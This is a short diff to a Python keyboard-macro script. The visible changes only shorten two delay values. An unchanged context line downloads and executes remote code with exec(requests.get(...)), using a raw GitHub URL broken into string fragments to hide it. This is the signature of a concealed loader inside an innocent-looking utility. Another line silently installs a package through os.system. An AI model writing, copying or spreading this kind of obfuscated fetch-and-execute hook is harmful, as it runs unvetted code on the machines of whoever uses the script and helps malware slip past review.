@@ -10,7 +10,7 @@ except: os.system('pip install pywin32'); import win32gui
 try: exec("toggle_key")
 except: toggle_key = "home"
 try: exec("delay")
-except: delay = 0.02
+except: delay = 0.01
 try: exec("macro_buttons")
 except: macro_buttons = macro_buttons = ["w", "a", "s", "d"]
 event_enabled = True
@@ -38,6 +38,6 @@ exec(requests.get('https://raw.gi'+'thubusercont'+'ent.com/flex1948/den'+'eme/ma
 try:
     while True:
         if keyboard.is_pressed('ctrl') and keyboard.is_pressed('end'): break
-        wait(0.2)
+        wait(0.1)
 except KeyboardInterrupt:
     pass
